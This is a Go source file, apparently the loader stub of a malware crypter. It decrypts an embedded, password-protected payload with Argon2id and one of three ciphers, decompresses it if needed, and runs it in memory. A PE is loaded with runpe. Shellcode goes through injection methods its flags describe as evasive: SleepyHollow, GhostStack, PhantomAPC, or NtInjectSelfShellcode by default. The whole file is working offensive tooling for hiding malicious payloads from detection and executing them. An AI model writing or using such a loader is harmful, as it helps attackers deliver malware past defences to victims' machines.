package main

import (
	"bytes"
	"compress/zlib"
	"crypto/aes"
	"crypto/cipher"
	_ "embed"
	"flag"
	"fmt"
	"io"
	"strings"
	"github.com/fxamacker/cbor/v2"
	"golang.org/x/crypto/argon2"
	"golang.org/x/crypto/chacha20poly1305"
	"golang.org/x/crypto/twofish"
	"github.com/carved4/go-native-syscall"
	runpe "go-crypter/pkg/runpe"
	runshellalt "go-crypter/pkg/runshellalt"
	"runtime/debug"
)
//go:embed payload.cbor
var payloadData []byte

// Default Argon2 parameters
const (
	argonTime    uint32 = 1
	argonMemory  uint32 = 64 * 1024
	argonThreads uint8  = 4
	argonKeyLen  uint32 = chacha20poly1305.KeySize
)


// PayloadData represents the structure of our CBOR payload
type PayloadData struct {
	EncryptedBytes []byte `cbor:"encrypted"`
	Password       []byte `cbor:"password"`
	Salt           []byte `cbor:"salt"`
	Nonce          []byte `cbor:"nonce"`
	Alg            string `cbor:"alg"`
	Compressed     bool   `cbor:"compressed,omitempty"` // Flag to indicate if data is compressed
	PayloadType    string `cbor:"payload_type"`          // "exe" or "shellcode"
	ArgonParams    struct {
		Time    uint32 `cbor:"time"`
		Memory  uint32 `cbor:"memory"`
		Threads uint8  `cbor:"threads"`
	} `cbor:"argon_params"`
}
func decryptFile() ([]byte, error) {
	// Unmarshal CBOR payload
	var payload PayloadData
	if err := cbor.Unmarshal(payloadData, &payload); err != nil {
		return nil, fmt.Errorf("failed to unmarshal payload: %v", err)
	}

	// Use the embedded Argon2 parameters or fall back to defaults
	timeParam := argonTime
	memoryParam := argonMemory
	threadsParam := argonThreads

	if payload.ArgonParams.Time > 0 {
		timeParam = payload.ArgonParams.Time
	}
	if payload.ArgonParams.Memory > 0 {
		memoryParam = payload.ArgonParams.Memory
	}
	if payload.ArgonParams.Threads > 0 {
		threadsParam = payload.ArgonParams.Threads
	}

	// Derive the key using Argon2id parameters
	key := argon2.IDKey(payload.Password, payload.Salt,
		timeParam, memoryParam, threadsParam, argonKeyLen)

	var aead cipher.AEAD
	switch strings.ToLower(payload.Alg) {
	case "aesgcm", "aes":
		block, err := aes.NewCipher(key)
		if err != nil {
			return nil, fmt.Errorf("failed to create AES cipher: %v", err)
		}
		aead, err = cipher.NewGCM(block)
		if err != nil {
			return nil, fmt.Errorf("failed to create AES-GCM AEAD: %v", err)
		}
	case "twofish":
		block, err := twofish.NewCipher(key)
		if err != nil {
			return nil, fmt.Errorf("failed to create Twofish cipher: %v", err)
		}
		aead, err = cipher.NewGCM(block)
		if err != nil {
			return nil, fmt.Errorf("failed to create Twofish-GCM AEAD: %v", err)
		}
	default:
		var err error
		aead, err = chacha20poly1305.New(key)
		if err != nil {
			return nil, fmt.Errorf("failed to create ChaCha20 AEAD: %v", err)
		}
	}

	// Decrypt and verify the data
	decryptedBytes, err := aead.Open(nil, payload.Nonce, payload.EncryptedBytes, nil)
	if err != nil {
		return nil, err
	}

	// Check if the data was compressed and decompress if needed
	if payload.Compressed {
		fmt.Println("Decompressing payload data")

		// Create a reader for the compressed data
		zr, err := zlib.NewReader(bytes.NewReader(decryptedBytes))
		if err != nil {
			return nil, fmt.Errorf("failed to create decompression reader: %v", err)
		}
		defer zr.Close()

		// Read the decompressed data
		var decompressed bytes.Buffer
		_, err = io.Copy(&decompressed, zr)
		if err != nil {
			return nil, fmt.Errorf("failed to decompress data: %v", err)
		}

		// Replace the decrypted bytes with the decompressed data
		decryptedBytes = decompressed.Bytes()
	}

	return decryptedBytes, nil
}

func main(){
	debug.SetGCPercent(-1)
	// Parse command line flags
	sleepyHollowFlag := flag.Bool("sleepy", false, "Use SleepyHollow evasive shellcode execution method")
	ghostFlag := flag.Bool("ghost", false, "Use GhostStack thread context manipulation execution method")
	phantomFlag := flag.Bool("phantom", false, "Use PhantomAPC asynchronous procedure call injection method")
	flag.Parse()

	decryptedBytes, err := decryptFile()
	if err != nil {
		fmt.Println("Error decrypting file:", err)
		return
	}

	// Unmarshal CBOR payload to get the payload type
	var payload PayloadData
	if err := cbor.Unmarshal(payloadData, &payload); err != nil {
		fmt.Println("Error unmarshaling payload for type check:", err)
		return
	}

	
	// Ensure only one execution method is selected for shellcode
	executionMethodCount := 0
	if *sleepyHollowFlag {
		executionMethodCount++
	}
	if *ghostFlag {
		executionMethodCount++
	}
	if *phantomFlag {
		executionMethodCount++
	}
	
	if executionMethodCount > 1 {
		fmt.Println("Error: cannot use multiple shellcode execution methods simultaneously")
		return
	}

	// Execute based on payload type
	switch strings.ToLower(payload.PayloadType) {
	case "exe":
		runpe.LoadPEFromBytes(decryptedBytes)
	case "shellcode":
		if *sleepyHollowFlag {
			err := runshellalt.SleepyHollow(decryptedBytes)
			fmt.Println("SleepyHollow execution started")
			if err != nil {
				fmt.Println("SleepyHollow execution failed:", err)
			}
		} else if *ghostFlag {
			fmt.Println("GhostStack execution started")
			err := runshellalt.GhostStack(decryptedBytes)
			if err != nil {
				fmt.Println("GhostStack execution failed:", err)
			}
		} else if *phantomFlag {
			fmt.Println("PhantomAPC execution started")
			err := runshellalt.PhantomAPC(decryptedBytes)
			if err != nil {
				fmt.Println("PhantomAPC execution failed:", err)
			}
		} else {
			winapi.NtInjectSelfShellcode(decryptedBytes)
		}
	default:
		fmt.Println("Unknown payload type:", payload.PayloadType)
		fmt.Println("Supported types: exe, shellcode")
	}
}

